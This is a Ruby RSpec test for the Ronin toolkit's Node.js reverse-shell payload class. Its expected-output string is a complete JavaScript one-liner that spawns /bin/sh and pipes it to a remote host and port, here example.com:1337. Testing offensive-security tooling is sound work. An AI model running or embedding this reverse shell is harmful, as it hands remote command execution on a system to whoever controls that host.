require 'spec_helper'
require 'ronin/payloads/builtin/js/node/reverse_shell'

describe Ronin::Payloads::JS::Node::ReverseShell do
  it "must inherit from Ronin::Payloads::NodeJSPayload" do
    expect(described_class).to be < Ronin::Payloads::NodeJSPayload
  end

  describe ".id" do
    subject { described_class }

    it "must equal 'js/node/reverse_shell'" do
      expect(subject.id).to eq('js/node/reverse_shell')
    end
  end

  let(:host) { 'example.com' }
  let(:port) { 1337 }

  subject do
    described_class.new(
      params: {
        host: host,
        port: port
      }
    )
  end

  describe "#build" do
    before { subject.build }

    it "must build node.js JavaScript that connects back to the host and port params" do
      expect(subject.payload).to eq(
        %{(function(){var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(#{port}, #{host.dump}, function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })();}
      )
    end
  end
end
